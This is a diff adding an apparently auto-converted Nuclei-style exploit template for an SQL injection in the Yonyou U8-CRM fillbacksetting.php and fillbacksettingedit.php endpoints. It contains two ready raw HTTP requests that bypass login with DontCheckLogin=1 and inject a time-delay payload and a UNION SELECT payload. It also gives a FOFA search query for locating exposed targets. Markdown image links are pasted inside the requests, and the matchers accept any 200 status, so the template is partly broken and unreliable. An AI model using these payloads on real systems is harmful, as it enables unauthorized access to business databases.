@@ -1,0 +1,58 @@
+id: poc-iwkttxkt8uw953tb
+info:
+  name: 用友U8-CRM系统fillbacksetting.php存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iwkttxkt8uw953tb'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iwkttxkt8uw953tb
+    fofa: title="用友U8CRM"
+http:
+- raw:
+  - 'GET /config/fillbacksetting.php?DontCheckLogin=1&action=delete&id=-99;WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1729347171151-504bf6da-2df8-4865-89d7-6a0087889a4f.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /config/fillbacksettingedit.php?DontCheckLogin=1&action=edit&id=1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,@@VERSION,NULL,NULL--+ HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Cookie: PHPSESSID=bgsesstimeout-;
+
+    Connection: close
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1729347171500-7c094f8e-a90f-4db2-aa56-197ce3c98df1.png)'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
